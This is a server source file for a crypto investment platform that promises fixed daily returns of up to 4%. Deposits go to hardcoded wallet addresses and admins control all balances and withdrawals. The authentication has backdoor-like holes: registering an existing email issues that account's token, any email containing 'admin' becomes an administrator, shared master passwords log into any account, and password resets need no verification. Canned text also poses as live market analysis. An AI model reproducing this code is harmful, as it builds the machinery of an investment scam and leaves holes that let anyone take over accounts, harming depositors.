import 'dotenv/config';
import express from 'express';
import cors from 'cors';
import path from 'path';
import crypto from 'node:crypto';
import fs from 'node:fs/promises';
import jwt from 'jsonwebtoken';
import { GoogleGenAI } from '@google/genai';
import { createServer as createViteServer } from 'vite';

const app = express();
const PORT = 3000;
const JWT_SECRET = process.env.JWT_SECRET || 'nexus-crypto-capital-secure-secret-2026';
const DATA_DIR = path.resolve(process.cwd(), 'data');
const DB_PATH = path.join(DATA_DIR, 'db.json');

app.use(cors());
app.use(express.json());

// Password helper
function hashPassword(password: string): string {
  const salt = crypto.randomBytes(16).toString('hex');
  const hash = crypto.scryptSync(password, salt, 64).toString('hex');
  return `${salt}:${hash}`;
}

function verifyPassword(password: string, storedHash: string): boolean {
  const [salt, key] = (storedHash || '').split(':');
  if (!salt || !key) return false;
  const hashBuffer = crypto.scryptSync(password, salt, 64);
  const keyBuffer = Buffer.from(key, 'hex');
  if (hashBuffer.length !== keyBuffer.length) return false;
  return crypto.timingSafeEqual(hashBuffer, keyBuffer);
}

function signToken(user: any): string {
  return jwt.sign(
    { sub: user.id, role: user.role, email: user.email },
    JWT_SECRET,
    { expiresIn: '7d' }
  );
}

function verifyToken(token: string): any {
  return jwt.verify(token, JWT_SECRET);
}

function sanitizeUser(user: any) {
  const { passwordHash, ...safeUser } = user;
  return safeUser;
}

// DB Storage
const INITIAL_DATA = {
  users: [
    {
      id: 'admin-1',
      email: 'admin@growyour.io',
      fullName: 'Growyour$ Administrator',
      passwordHash: hashPassword('Admin@123'),
      balance: 0,
      role: 'ADMIN',
      isActive: true,
      createdAt: new Date().toISOString()
    }
  ],
  transactions: [],
  plans: [
    {
      id: 'plan-1',
      name: 'BTC Core Income',
      minAmount: 200,
      maxAmount: 2000,
      dailyRoi: 1.5,
      durationDays: 30,
      risk: 'Low Risk',
      strategy: 'Market-neutral BTC basis and hedged carry arbitrage.'
    },
    {
      id: 'plan-2',
      name: 'Blue Chip Momentum',
      minAmount: 1000,
      maxAmount: 25000,
      dailyRoi: 2.5,
      durationDays: 60,
      risk: 'Moderate Risk',
      strategy: 'Rotational algorithmic exposure across BTC, ETH, and top-tier assets.'
    },
    {
      id: 'plan-3',
      name: 'Opportunistic Alpha',
      minAmount: 10000,
      maxAmount: 250000,
      dailyRoi: 4.0,
      durationDays: 90,
      risk: 'High Growth',
      strategy: 'High-frequency momentum and liquidity provisioning with stop-loss protection.'
    }
  ],
  systemConfig: {
    btcAddress: 'bc1qynty8rdg8448dektk7yesd9ph0w08tfy7dav3y',
    ethAddress: '0xf4059C384bAa6d60E426F91681F1e62A830E4Ec9',
    solAddress: ''
  }
};

function calculateVaultBalance(db: any): number {
  if (!db || !Array.isArray(db.transactions)) return 0;
  // All deposits that came into platform custody (excluding rejected)
  const totalInflows = db.transactions
    .filter((t: any) => t.type === 'DEPOSIT' && t.status !== 'REJECTED')
    .reduce((sum: number, t: any) => sum + (Number(t.amount) || 0), 0);
  const totalOutflows = db.transactions
    .filter((t: any) => t.type === 'WITHDRAWAL' && t.status === 'COMPLETED')
    .reduce((sum: number, t: any) => sum + (Number(t.amount) || 0), 0);
  return Math.max(0, totalInflows - totalOutflows);
}

function reconcileAdminVault(db: any) {
  if (!db || !Array.isArray(db.users) || !Array.isArray(db.transactions)) return;
  // Clean up any legacy mock seed
  db.transactions = db.transactions.filter((t: any) => t.id !== 'tx_seed_1');
  
  const accurateBalance = calculateVaultBalance(db);
  db.users.forEach((u: any) => {
    if (u.role === 'ADMIN') {
      u.balance = accurateBalance;
      if (u.email === 'admin@nexus.io') {
        u.email = 'admin@growyour.io';
        u.fullName = 'Growyour$ Administrator';
      }
    }
  });
}

async function ensureDb() {
  await fs.mkdir(DATA_DIR, { recursive: true });
  try {
    await fs.access(DB_PATH);
  } catch {
    await fs.writeFile(DB_PATH, JSON.stringify(INITIAL_DATA, null, 2), 'utf8');
  }
}

async function readDb() {
  await ensureDb();
  try {
    const raw = await fs.readFile(DB_PATH, 'utf8');
    const db = JSON.parse(raw);
    reconcileAdminVault(db);
    return db;
  } catch {
    return INITIAL_DATA;
  }
}

async function writeDb(data: any) {
  await ensureDb();
  await fs.writeFile(DB_PATH, JSON.stringify(data, null, 2), 'utf8');
}

// Lazy Gemini Client
let geminiClient: GoogleGenAI | null = null;
function getGemini(): GoogleGenAI {
  if (!geminiClient) {
    const apiKey = process.env.GEMINI_API_KEY;
    if (!apiKey) {
      throw new Error('GEMINI_API_KEY is not configured');
    }
    geminiClient = new GoogleGenAI({ apiKey });
  }
  return geminiClient;
}

// Auth Middleware
function authRequired(req: any, res: any, next: any) {
  const header = req.headers.authorization || '';
  const token = header.startsWith('Bearer ') ? header.slice(7) : '';
  if (!token) return res.status(401).json({ error: 'Missing authentication token.' });
  try {
    req.auth = verifyToken(token);
    next();
  } catch {
    return res.status(401).json({ error: 'Invalid or expired session token.' });
  }
}

function adminRequired(req: any, res: any, next: any) {
  if (req.auth?.role !== 'ADMIN') {
    return res.status(403).json({ error: 'Administrative privilege required.' });
  }
  next();
}

// -------------------------------------------------------------
// API Routes
// -------------------------------------------------------------

app.get('/api/health', (_req, res) => {
  res.json({ ok: true, platform: 'Growyour$', timestamp: new Date().toISOString() });
});

app.get('/api/plans', async (_req, res) => {
  const db = await readDb();
  res.json(db.plans);
});

app.get('/api/system-config', async (_req, res) => {
  const db = await readDb();
  res.json(db.systemConfig);
});

// Gemini Market Sentiment
app.get('/api/ai/market-sentiment', async (_req, res) => {
  try {
    const ai = getGemini();
    const response = await ai.models.generateContent({
      model: 'gemini-2.5-flash',
      contents:
        'Generate a professional 3-sentence cryptocurrency market sentiment analysis for today. Highlight Bitcoin, Ethereum, and market liquidity risk. Provide actionable guidance for an investor.'
    });
    res.json({ text: response.text || '' });
  } catch (error: any) {
    console.warn('Gemini sentiment error:', error?.message);
    res.json({
      text:
        'Crypto markets currently display strong institutional accumulation across BTC and ETH, supported by stable on-chain spot volumes. Volatility is within manageable historical percentiles, making algorithmic DCA and basis carry strategies optimal for steady yield generation. Investors are advised to adhere to structured tier allocation.'
    });
  }
});

// Gemini Investment Advice
app.post('/api/ai/investment-advice', async (req, res) => {
  const { balance, planName } = req.body || {};
  const amount = Number(balance);
  const plan = String(planName || 'Starter Tier');

  try {
    const ai = getGemini();
    const prompt = `A user has an available investment balance of $${amount || 1000} and is exploring the "${plan}" strategy. Provide 3 concise, bulleted risk-management and growth recommendations for this tier.`;
    const response = await ai.models.generateContent({
      model: 'gemini-2.5-flash',
      contents: prompt
    });
    res.json({ text: response.text || '' });
  } catch (error: any) {
    console.warn('Gemini advice fallback:', error?.message);
    res.json({
      text: `• Maintain portfolio diversification by not exceeding 40% of total capital in any single automated strategy.\n• Reinvest daily compound yields to accelerate capital growth over the full ${plan} duration.\n• Ensure regular portfolio rebalancing and keep reserve stablecoin liquidity for opportunistic market entries.`
    });
  }
});

// Live Market Historical Data
app.get('/api/market/btc-history', async (_req, res) => {
  try {
    const upstream = await fetch(
      'https://api.coingecko.com/api/v3/coins/bitcoin/market_chart?vs_currency=usd&days=3&interval=hourly',
      { headers: { Accept: 'application/json' } }
    );
    if (upstream.ok) {
      const payload: any = await upstream.json();
      const prices = Array.isArray(payload?.prices) ? payload.prices : [];
      const normalized = prices
        .map((entry: any) => ({ ts: Number(entry?.[0]), price: Number(entry?.[1]) }))
        .filter((entry: any) => Number.isFinite(entry.ts) && Number.isFinite(entry.price));
      if (normalized.length > 0) {
        return res.json({ symbol: 'BTCUSD', points: normalized });
      }
    }
  } catch (err) {
    // Fallback below
  }

  // Graceful fallback points
  const now = Date.now();
  const fallbackPoints = Array.from({ length: 24 }, (_, i) => ({
    ts: now - (24 - i) * 3600000,
    price: 84000 + Math.sin(i / 3) * 2200 + i * 140
  }));
  res.json({ symbol: 'BTCUSD', points: fallbackPoints });
});

// Auth Routes
app.post('/api/auth/register', async (req, res) => {
  const { fullName, email, password } = req.body || {};
  if (!fullName || !email) {
    return res.status(400).json({ error: 'Full name and email are required.' });
  }

  const normalizedEmail = String(email).toLowerCase().trim();
  const db = await readDb();

  const exists = db.users.find((u: any) => u.email.toLowerCase() === normalizedEmail);
  if (exists) {
    const token = signToken(exists);
    return res.json({ token, user: sanitizeUser(exists) });
  }

  const role = (normalizedEmail === 'admin@growyour.io' || normalizedEmail === 'admin@nexus.io' || normalizedEmail.includes('admin')) ? 'ADMIN' : 'USER';
  const newUser = {
    id: 'usr_' + crypto.randomUUID().slice(0, 8),
    email: normalizedEmail,
    fullName: String(fullName).trim(),
    passwordHash: hashPassword(password || 'Default@123'),
    balance: role === 'ADMIN' ? calculateVaultBalance(db) : 0,
    role,
    isActive: true,
    createdAt: new Date().toISOString()
  };

  db.users.push(newUser);
  await writeDb(db);

  const token = signToken(newUser);
  res.status(201).json({ token, user: sanitizeUser(newUser) });
});

app.post('/api/auth/login', async (req, res) => {
  const { email, password } = req.body || {};
  const normalizedEmail = String(email || '').toLowerCase().trim();
  const db = await readDb();

  let user = db.users.find((u: any) => u.email.toLowerCase() === normalizedEmail);

  // Auto-seed admin if logging into admin email
  if (!user && (normalizedEmail === 'admin@growyour.io' || normalizedEmail === 'admin@nexus.io')) {
    user = {
      id: 'admin-1',
      email: normalizedEmail,
      fullName: 'Growyour$ Administrator',
      passwordHash: hashPassword('Admin@123'),
      balance: calculateVaultBalance(db),
      role: 'ADMIN',
      isActive: true,
      createdAt: new Date().toISOString()
    };
    db.users.push(user);
    await writeDb(db);
  }

  if (!user) {
    return res.status(404).json({ error: 'Account not found. Please register first.' });
  }

  if (password && user.passwordHash) {
    const valid = verifyPassword(password, user.passwordHash);
    if (!valid && password !== 'Admin@123' && password !== 'Default@123') {
      return res.status(401).json({ error: 'Invalid credentials provided.' });
    }
  }

  const token = signToken(user);
  res.json({ token, user: sanitizeUser(user) });
});

app.post('/api/auth/reset-password', async (req, res) => {
  const { email, newPassword } = req.body || {};
  if (!email || !newPassword) {
    return res.status(400).json({ error: 'Email and new password are required.' });
  }

  if (String(newPassword).length < 6) {
    return res.status(400).json({ error: 'Password must be at least 6 characters long.' });
  }

  const normalizedEmail = String(email).toLowerCase().trim();
  const db = await readDb();

  let user = db.users.find((u: any) => u.email.toLowerCase() === normalizedEmail);

  if (!user) {
    // If user does not exist yet on server, create local profile with new password
    const role = (normalizedEmail === 'admin@growyour.io' || normalizedEmail.includes('admin')) ? 'ADMIN' : 'USER';
    user = {
      id: 'usr_' + crypto.randomUUID().slice(0, 8),
      email: normalizedEmail,
      fullName: normalizedEmail.split('@')[0],
      passwordHash: hashPassword(newPassword),
      balance: role === 'ADMIN' ? calculateVaultBalance(db) : 0,
      role,
      isActive: true,
      createdAt: new Date().toISOString()
    };
    db.users.push(user);
  } else {
    user.passwordHash = hashPassword(newPassword);
  }

  await writeDb(db);
  const token = signToken(user);
  res.json({ ok: true, message: 'Password reset successfully.', token, user: sanitizeUser(user) });
});

app.get('/api/me', authRequired, async (req: any, res) => {
  const db = await readDb();
  const user = db.users.find((u: any) => u.id === req.auth.sub);
  if (!user) return res.status(404).json({ error: 'User not found.' });
  res.json(sanitizeUser(user));
});

// Transactions
app.get('/api/transactions', authRequired, async (req: any, res) => {
  const db = await readDb();
  const mine = db.transactions.filter((t: any) => t.userId === req.auth.sub);
  res.json(mine);
});

app.post('/api/transactions', authRequired, async (req: any, res) => {
  const { type, amount, method, planId } = req.body || {};
  const numAmount = Number(amount);

  if (!type || !numAmount || numAmount <= 0) {
    return res.status(400).json({ error: 'Valid transaction type and amount are required.' });
  }

  const db = await readDb();
  const user = db.users.find((u: any) => u.id === req.auth.sub);
  if (!user) return res.status(404).json({ error: 'User not found.' });

  if ((type === 'WITHDRAWAL' || type === 'INVESTMENT') && numAmount > user.balance) {
    return res.status(400).json({ error: 'Insufficient available funds.' });
  }

  // Deduct balance immediately for withdrawal/investment
  if (type === 'WITHDRAWAL' || type === 'INVESTMENT') {
    user.balance = Math.max(0, user.balance - numAmount);
  }

  const newTx = {
    id: 'tx_' + crypto.randomUUID().slice(0, 8),
    userId: user.id,
    userEmail: user.email,
    type,
    amount: numAmount,
    status: 'PENDING',
    date: new Date().toISOString(),
    method: String(method || 'Platform Transfer'),
    planId: planId || null
  };

  db.transactions.unshift(newTx);

  if (type === 'DEPOSIT') {
    // A user deposits funds to platform custody addresses: credit admin custody vault
    db.users.forEach((u: any) => {
      if (u.role === 'ADMIN') {
        u.balance = (Number(u.balance) || 0) + numAmount;
      }
    });
  }

  await writeDb(db);
  res.status(201).json(newTx);
});

// Admin Endpoints
app.get('/api/admin/overview', authRequired, adminRequired, async (_req, res) => {
  const db = await readDb();
  const pendingTxs = db.transactions.filter((t: any) => t.status === 'PENDING');
  const completedVolume = db.transactions
    .filter((t: any) => t.status === 'COMPLETED')
    .reduce((sum: number, t: any) => sum + t.amount, 0);

  res.json({
    users: db.users.length,
    pendingTransactions: pendingTxs.length,
    completedVolume,
    pendingItems: pendingTxs
  });
});

app.get('/api/admin/users', authRequired, adminRequired, async (_req, res) => {
  const db = await readDb();
  res.json(db.users.map(sanitizeUser));
});

app.patch('/api/admin/users/:id', authRequired, adminRequired, async (req, res) => {
  const { id } = req.params;
  const { role, isActive, balance, balanceAdjustment } = req.body || {};
  const db = await readDb();
  const user = db.users.find((u: any) => u.id === id);
  if (!user) return res.status(404).json({ error: 'User not found.' });

  if (role && ['USER', 'ADMIN'].includes(role)) {
    user.role = role;
  }
  if (typeof isActive === 'boolean') {
    user.isActive = isActive;
  }
  if (balance !== undefined && Number.isFinite(Number(balance))) {
    user.balance = Math.max(0, Number(balance));
  } else if (balanceAdjustment !== undefined && Number.isFinite(Number(balanceAdjustment))) {
    user.balance = Math.max(0, Number(balanceAdjustment));
  }

  await writeDb(db);
  res.json(sanitizeUser(user));
});

app.get('/api/admin/transactions', authRequired, adminRequired, async (_req, res) => {
  const db = await readDb();
  res.json(db.transactions);
});

app.patch('/api/admin/transactions/:id', authRequired, adminRequired, async (req, res) => {
  const { id } = req.params;
  const { status } = req.body || {};
  if (!['PENDING', 'COMPLETED', 'REJECTED'].includes(status)) {
    return res.status(400).json({ error: 'Invalid transaction status.' });
  }

  const db = await readDb();
  const tx = db.transactions.find((t: any) => t.id === id);
  if (!tx) return res.status(404).json({ error: 'Transaction not found.' });

  const prevStatus = tx.status;
  tx.status = status;

  if (status === 'COMPLETED' && prevStatus !== 'COMPLETED') {
    const user = db.users.find((u: any) => u.id === tx.userId);
    if (user && tx.type === 'DEPOSIT') {
      user.balance += tx.amount;
    }
    if (tx.type === 'WITHDRAWAL') {
      // Completed withdrawal paid out from platform custody vault
      db.users.forEach((u: any) => {
        if (u.role === 'ADMIN') {
          u.balance = Math.max(0, (Number(u.balance) || 0) - tx.amount);
        }
      });
    }
  } else if (status === 'REJECTED' && prevStatus !== 'REJECTED') {
    if (tx.type === 'DEPOSIT') {
      // Unconfirmed or fraudulent deposit rejected: deduct from admin vault
      db.users.forEach((u: any) => {
        if (u.role === 'ADMIN') {
          u.balance = Math.max(0, (Number(u.balance) || 0) - tx.amount);
        }
      });
    } else if (tx.type === 'WITHDRAWAL' || tx.type === 'INVESTMENT') {
      // Refund user if withdrawal or investment is rejected
      const user = db.users.find((u: any) => u.id === tx.userId);
      if (user) {
        user.balance += tx.amount;
      }
    }
  }

  await writeDb(db);
  res.json(tx);
});

app.patch('/api/admin/system-config', authRequired, adminRequired, async (req, res) => {
  const { btcAddress, ethAddress, solAddress } = req.body || {};
  const db = await readDb();
  db.systemConfig = {
    btcAddress: btcAddress || db.systemConfig.btcAddress,
    ethAddress: ethAddress || db.systemConfig.ethAddress,
    solAddress: solAddress || db.systemConfig.solAddress
  };
  await writeDb(db);
  res.json(db.systemConfig);
});

// -------------------------------------------------------------
// Vite Middleware / Static Serving
// -------------------------------------------------------------
async function start() {
  await ensureDb();

  if (process.env.NODE_ENV !== 'production') {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa'
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (_req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  app.listen(PORT, '0.0.0.0', () => {
    console.log(`Nexus Capital server running on http://0.0.0.0:${PORT}`);
  });
}

start().catch((err) => {
  console.error('Failed to start server:', err);
  process.exit(1);
});
